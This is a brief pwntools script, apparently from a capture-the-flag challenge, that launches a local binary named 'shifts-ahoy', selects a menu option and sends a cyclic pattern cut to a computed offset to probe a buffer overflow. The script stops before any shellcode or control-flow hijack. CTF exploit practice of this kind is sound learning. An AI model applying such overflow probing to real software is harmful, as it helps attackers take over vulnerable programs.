from pwn import *

p = process("./shifts-ahoy")
input("debug")

p.recvuntil(">")

p.sendline("1")

p.recvuntil("message:")

payload = cyclic(cyclic_find("waaa"))

p.sendline(payload)

p.interactive()